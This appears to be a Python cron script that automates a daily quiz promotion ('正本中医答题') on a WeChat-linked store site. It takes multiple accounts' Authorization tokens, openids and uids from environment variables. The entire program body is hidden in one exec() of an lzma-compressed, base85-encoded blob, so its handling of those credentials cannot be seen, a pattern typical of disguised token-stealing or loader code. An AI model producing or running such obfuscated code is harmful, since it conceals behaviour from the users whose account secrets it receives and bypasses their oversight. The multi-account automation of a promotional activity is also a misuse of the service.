# -*- coding: utf-8 -*-
"""
cron: 30 6 * * *
new Env('正本中医答题');
环境变量：
- ZhengBen_Token: 必填，格式为 Authorization#openid#uid#store_id，支持多账号，多账号用&或换行分隔
- ZB_HUODONG_ID: 必填，活动ID，每天需要更新
- ZB_ENABLE_CONCURRENT: 选填，是否启用并发，默认true，可选值：yes/no, true/false, 1/0
- ZB_MAX_WORKERS: 选填，最大并发数，默认5
"""

# ================== 配置区域 ==================
# 1. 基础配置
BASE_URL = "https://d51.shiyitx.com"  # 基础URL
STORE_ID = "12945"              # 默认门店ID

# 2. 并发配置
ENABLE_CONCURRENT = True        # 是否启用并发
MAX_WORKERS = 5                # 最大并发数

# 3. 请求配置
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 NetType/WIFI MicroMessenger/7.0.20.1781(0x6700143B) WindowsWechat(0x63090c2d) XWEB/11581 Flue"

# 4. 账号配置（推荐使用环境变量，这里作为备用）
ACCOUNTS = [
    # 格式：Authorization#openid#uid#store_id
    # 例如："xxxxx#xxxxx#xxxxx#12945"
    "",  # 在引号内填写账号信息
]

# ================== 脚本主体 ==================
import requests                                                  
import json
import os
import time        
import random
import sys
import datetime
import concurrent.futures
import re
exec(__import__('lzma').decompress(__import__('base64').b85decode(b'v)K?NN*|9X7N}y{K;R2C{Wp48S^xk9=GL@E0stWa761SMbT8$j;6tAhl3f5Y8A$(63U4kFb(=*R3Wgk#57zl$4rJ?Iu*iog%b1TWT@VPc4dU%c{X(R1V*Uaw3PzBiYGKR(0)ggmigTf3|Cu*(yZM5bf#(j4E;lfS^KE}8_IlDI*6z>HX;H)uH9BU@F0F(M=+g@LH5`>u-BI<|3Dk9A-->b9eM!uAW_Gn?cIFiS9V^-2#ZM*q_Uv{*?XPeFqDYImO4;GFdF0385y`=0IDoq=X$~zxJ?X^0TsvFx=VMEXCY>95We*{N!Uje7sQC3~B~S9Q^;*)snQmJzvPZV`VS-*>uSFCw+wgP#KR2zHO`3;3+m@*6m@&GwW>You)4pyJ_P)BDUZrWlZqJ+ID|3%xldwjMk*|_$?m~p7@c3wHElyVT;N35iq}?}Nlm$$&QC3W+Bxvy<n2Q&c+xBTmE#2gR#62PfbwMOWZx7j0>*j0!fg35}UcePf?<}Brp}ni3UJl5HI^I3=a9mBKO593H{Qx<kp_OFRIE&@1cmNY`-;XUh*DW-wxIgF^cE(GrQ&98!6fdq$VHkv-P5J@R*SbrxqVrBdTQ-+>=76QA3A4#fU44*YfN>2J?PtrXmE{2{8NhV%K4w3N5vl#^Ntij&O1Mv{ny6wV8ymTBR0-8nskx~?)*tfA8Gg@L=l-897oENET*6xIlTb7Cw4K0wtkZN!Izg7S)wM&t`N8>zWA;lLRIk~)RcC{Vk+G?YDhL<fKhD`rYDfn2T?Br3E4C3l$G3r7{Z4#FdAbZ<-{p#NYU$rF)4>HFhV`qjA}*l+_4z*)3+UG}jXT#U4i}Sit*<chx3O};B$=;$)!Ta@Cr^DtHCt0)`s~1GRSHBlgaU4GoIm#;M#S*^ksEx(9rTu{hz%k_eCPF~y~iyTH_pVV1t?Qjei@0z^(D&+MVnA%{0PmR6a0CYT@3I(U*?Q1dIKFo8o6@?v3OtWIZPW|rqo4iJx@SDM`o8+GuGzJD+VLSDX-T5<K`WfgyA%vd?zi|6=PNZrJ?^t_l^n>W@DK3gobXUBf+PmN$624?04X%(RZ&_kyF<fXC`^ZFp(5@XGG$DDkx%S{$y2gc~MxY@$_3Eq*LTBs>S7gaPHrPgOe<@URI&wgs0uYon{fge7$X+&yg{u5>5IJ*uPh-wIXqEo+x2#7@yjVaSi)w1AdUWyM!@M9bPvW@zVK<6|ovBuP}eNoX8bm0pA!n6^(4L8<*>Dyv=Ep&za=ks>Xb=MhKac>y%WlVR}{z$;XfV%Z!&dBGR;42vEk_$Viw(4#9>6{97~VZSb5=>Hw`Ura+AzE|uyTtRlUP>|;s;BtwK_s+dI!w;h?ZE!neIq#orsHv*HBekW)qR-Z~SG|6Pg<R<AFmLFfOF!Iz971(}aIb4I&d}BuWy|ZdWB`~=1%OwR?T{uGTgy&N_>J>fUQs6V>n_7XkGMwNW$TV~UH5Pm=B;5-s(8)5{qO6fkm0h1Pn>jHr*%|C~!i8Qg#q-2%OpR~!niQslTCDq(X2W)qXG^5s)@y+s5B-X)MYbs;j`Dk<o38udIN4vvXq63dKXdFEq`#g<p<J#rdnxE4b~N}N=~ltb@&ON{7zP-;P3D+{sMAXsx$6uhdf=!WVoiyXbhDz+5Sdr=|6ILf9;dS(x}gnf^5`x;QbomlT}F90P$S<ripmDrZvmDkds$8LPYqbXK#iXCuV!3-Z#lG7(|E+>wom08MvJnu25&gSb{0+*GZ|;8QW=vxrrFqKdW*HfK*zbI&St}YbuAv=M>^CBfAst^PvgJRT>pJ5y{8~a>N>xP+Yqy;&^PnONta=ajh9DXX|JG3dKGsa6B^S$3cbG1>JO9)qY+~aFozXA+{Pk6QdfTy;T)O?8bsaeXDM@ezG>K=Dvd04EBiTck3qKZyZilh@Xd+~FA|HNY4kaHXprOiw+*Ta>HUfpPvfqFr3i0{6wmdS+QAA?_=_gaXrX4eL1rqVeEof+&W)R?fgcE0y0GI>f8`hJMU5{{K@qIOEe%f9Z#S{vAu*(wsU9g{$(I!dHUzWxzkP4fsK#0~oWu7D>Ma{ph1k4uDp>o@BtFPQf6?$}c?zyC7JP&YZgKr2(^lHOG()od$c-fjvD!L{tzhPCJ(}n|oWZtPE=~2A^T`#ym+!QmhzfF<I5!ZQ3NOxNhsG5hocrR|3hiXQYrdRv&Ou=S(|8X~W2NcI11=c~Xll7$kyX7zs{~xBteH~ATALz~6d!dOxl<mk*OVv~{to1K#Xw#yo=H}}HrUw&Fe<k|Kjaisr4dJxl9b;fh}?-Uq=!<DFG~6<cl5Hf7U|;DAKYNey;JYx6o&5zU+9+d6m6j-Iv$$)XbmJ^_R$)#t<?<I3Vy?Ndotu;My)k886Ff|t{?kuo_!I}e`~o{=lPd=PwuKXbLBd%hv<DGy3XmKTD=uJWbBpmDOBRc-X2wfT(+26m$rYK|3*4`+(sb280zU3s7G}w;LnjB1dOX=m`QL>nOibslT6*JqFq*-C{b<zZ4f*8+aW2hx{k#+&a6FfKc~v5)ekefwcnWR+d)yrYqf>&u1K}1M1olPJ|iw6OqEVyDQ@a<gc;C4sKefyJ-@fNB2M=^G5)4NRZ2`CL{A0Z(!+R97ZN;hr?Yk_CGvwwl_CAH=v4u{Q|^Bq1QMngZ%)nOTLIBIddu9M!36@BWejJ~G*<fm<}fQ3bd!FCMNIvMbu7}hYeHt7f{3X(K+~J0P#sGE+Inx7@nnhd!ucnjUmYT2ny*nwM_kb(=rsLDDGzBW7?;Y}6_J|?Jdk&!L1<5j-i?5Q${ITPm)LYYYz{HElMi0+aT!)`9%kr=_XRW*eVnG@Xe5}Gic`ey+sR<1#Vyc&QQz0^u8pg1lXl=|nd?AUxU?UPx$2$9GbpmA*9aGVCLBWon@;*EquiGkBPE55zByjjzD*;UdAzk{<Go;Dx4})vuPVpo1;i1QIA1>R+9i|{!T@E@pvT#QEv?}5vj}Pf)ZtD5xpK|N*bot~Z;AFE#@8^u(YwmLs{Ho!47#^}pBC5aEnje2Z$2fmc>|Xmz*98=N#=6~#tHixa$ZoxdoS3&M||!XKj>H33Sop?D+CJLe!+vZ*J$aPJNCcSe9BZa+~f+kwIpB<UmJATwtbAv@I;F~@|Sn0ryOOp9byBw79aEDG7)a9K{d6)G;j{rbo?%A_;b?Hz^sv$L4A{3H^r3xUqQ2T4h~H+FtY>=&V%jfcv&ag9)6CS(?KgaADb=}VM9RVyv1B2Y&;E75jQj_CZg*Osg+|TT+_kj;JeEmK8ci<F2ja65Ig7y*HgNoN&JEObFwT;um=SdZuKr_m254dr9Zq7F$`6D`I!%$2e3SBMGg>wetm;qYfR_1s`eLHB4D?}$knO5G|(bOl9uvU+4DuXMKA@}!P}#HXO!A9Ke{qdj<PlrBtT3F<CTer-8;wYca$@i=Y(gj!Fr=2OnX^5Kd6L>Vx=8fZv9lJSjlt9?Jkw}VOn9p@0-hYkzx_9Dt^B<2a;(3Xj4lesmv%mz1K(10T<<ywiU;9MdAn_EmLj;-#n!r0C4Ld84WGyRl#t%y+EK2d9O70;1$d}H_zLmga$oQk7tSHNbP*2TU!`kS|asWJ;?%Y5yN}6;BdBkA*eqxrN~R2xv{N?nDp!Zq%ZwOgccHgm^`zHapJ>fwYH#{EA~vPAE}eClm=*=6d?}6L%_A>WlymG@C{KNpagK>f}y4sf7k~DL<9S8#?w8$X?>Ou#+<<B<GGi7jP~`hi~twK?A#)5r4=w+?K=jh*~yhd<nTx(f7{f<M9Ttp#d>L&Cb=!&?So#cJegrib-fUyumx>GZ@!9y#lL2mn2wSje#B|K8Q@aQnlCtUQ(deHJwRQr!#9LwDSL~B%1pmcTQXK{oNDyFJd4s&olb%}E<U@Ab+j=1vYoU;qHO7=EI-$dRLf&`n{<abp00R3yQ+ZcFo3^Cl8mrA38S(OL#RiU1MDJdmAuqtaI_bz1@;>K7T`AH-<Jjzi5Hz^q|T)VBq!~1J3@%;`>SDCKP^*W{*KoKZ>OoVqrZ)quKVb_-8zE}L=cp|3%FiG{KJyJ>uMx7H=md$=GN3u<>(MsJ|-y>tl854*3)}N+d4D({+&3BPrZbu2n?w}Go0HMwz*~@BE>q6xjL6(Q?-gjEA#Y=xr7B(%>wD!Z-)avF30R}Q8zmkk@Kg8e#*RAR*fR(M96(S)Zw^aV_PL8ZfL1@aY7Om<IOp}ciC}OJj!OuIEa?Ue_)^*G=@5?V&CezZY-R$HF&fA_qJ{)MZ3cRnNg1|6~oTPWRTv|JG;Tw=m%INhgHHW_M)-+Vt#HP4Q>tgBVq1CES5r5kqmcgWjx%xTK{@e-fl;T&i1z7jjM^(Lw5)^DDwTWL9lx*T4yk{UgVI6;8e+`TCFs3dSk#>hGS_HPUEv&w_62^y6CJlwL+h8Lj~1y6&UcTNkb9Z?t6Q3@NLCTqJ1B~?gm+RJlposn0E=le#>XRFJ&y+Vzie!EAbxAeaw78HlA19t}puEKso;#8Tf`JE}&1v6_&P_$!<uvPZ@?bT-;rvxC$S@ECK@?(TX-EcrmI0#+ku}1T-*hUl>-I)d%BvZQN)5+Zzx=M;--&0Hy%nK^BLrBoK+vef%g_-XeASUo<X+(C5Tu1<k>6Nq%u=+8t?-A8{|&9(#!o$g-aIG~dE=2PsVDSt*I(&&J3Iu#^rC*hPp)tK7RPG9C1g=n@F%ml0vtT8XX31weEw_yH&^M?Xth9Ba8^UMCs;{QBn8yO77!8de3DjwsnL{8E@bJ2Qt^0^@nMHB!Y=CGqiVrY$D;K5kRp=Vg2?*RyHW_^qoNE{Za}8sM?ahnUu8d#W|xvVebpo%*3*+yX%)D8Q(!Q&Hm5TT+9I>YGfWQr<<xq~q+lfUN{S4loQY^2b>}b%ZBr_~wQipA3rWRrr#Z^hzBR{vDmPS+~xa6Fhq@vfmcE)(p`N1}DaU7b9CZEUpPnA}QL49+EhkZ2dcSMSK$rSECI1nM@UPHvXc?{H7it5dk;ngDfZy*gakj!^O<SJe9wVng0l=>iSA~+1-S=>xZ(;=AsHjwIto{dm(ifHyFi|DepHf0HZ|#FY&ClG&2PQ-}s9phk&bWQ^fOq7gngSnZdPfJ&V~JL*yhMY)!$&7`BC5GX5xXTwc>;txEtSyiLBfll%W0&cVdKRy%P8RT?X^>!wa_GnM%(Suf7XPvz5>9A%JwDHCE4E)DO<&j0dr_&_35?#7k&VT!y_=`EDbtqy=hJg1oigH2mGQfRAq#A|3cch^@A_k?HFvf>sAbJ??<v=`P+2YURP+oRtfeGPm+xwJiM-kq)kF%1ZU{yQ@VIK{ZzHEslEzVPTjzU_|qpdLUmhhL96)G2N!5)CTQ9=!};?`txj&mBCzrTx_*?R1iMWSjRXf<H?9O`0kAbqv5?A!`&5)q|jGgRRk6K4<W|ce#M?d>4E2z+0l*yk55A%!^~x_zhM)u`~p%%bE^~O#bWYEDWWS(QBh$y~SI!AefBoJG?64>I$J$LLn)8v0FI!J;#p!i9mU`je?p`LG6OpCSCX+Z5pVOtsjdA)a_x?l-0N~0tGGEp(c!b>!~am`?g;dCzdS4WuE&!mw(`GM@;!m@u#&E2`Y_xTb?EyaT@>AX$}o!frA_K^2!A25=S<Y=EVwgE3-D9M+$b7GSwE;)0YFeXuUuU9g@GRNwwrr=CDZ^fT8ofjUO~!`X;*6hWF+%wAYND24W#EON!fL#gIb~WO*CSO$B~O1Pr{ZuotS>D#T7!?Il{Qix4Z)6`-7ZVz%-<nR+(HcCNdDI39EuLFX3g2lYYaW!jnu*nesh$L0HYCDK}tWLq}Mqw?Zpx4jEF38eD)z{yMq7<-dB_f(Cnn9Pmeay;P7pCcQ_Fj&Aq`C@1|A^-26&jR_gm{qFeA^NK7<sFooYSq!aK`Rt%svQhg9L3|PlhT!ThrG7a8<(PZ*E7z&^QM*w!Smi{wtGBDmw*hHj_2Og-8)@T0D57XGA3L!$L)s=Q*ALxaolLK(Vg4Y^ppD;OA5&^i7p=GL<UdrKoPsWWtC+CHv52dL_*<hSG3BGxDZ>9PBTHBcv9J~`{mQ6>5Rh?p4Q-&00000nSMtow?LuP00FKgpoakfb|Gk4vBYQl0ssI200dcD')[16:]).decode())
